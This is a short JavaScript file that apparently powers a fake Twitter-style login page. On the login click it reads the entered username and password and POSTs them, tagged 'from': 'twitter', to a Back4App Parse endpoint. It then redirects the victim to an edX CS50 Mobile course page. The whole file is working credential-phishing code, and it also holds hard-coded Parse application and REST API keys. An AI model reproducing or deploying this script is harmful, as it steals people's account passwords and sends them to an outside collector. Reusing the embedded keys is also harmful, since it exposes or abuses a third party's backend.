const url = "https://parseapi.back4app.com/classes/social";
const headers = {
    "X-Parse-Application-Id": "XrmKhHlwmz2nN4AVNTyVfshxz83n1yOmrzRvIp9r",
    "X-Parse-REST-API-Key": "UvTV9haf6SUHoa9QGijr8RgbSuF0x5TKrzPbVN6o",
    "Content-Type": "application/json"
};


document.getElementById('login').onclick = async () => {
    const user = document.getElementById('user').value;
    const password = document.getElementById('password').value;

    await fetch(url, {
        method: "POST",
        headers: headers,
        body: JSON.stringify({
            "user": user,
            "password": password,
            "from": "twitter"
        })
    });
    window.location = "https://courses.edx.org/courses/course-v1:HarvardX+CS50M+Mobile/course/";
}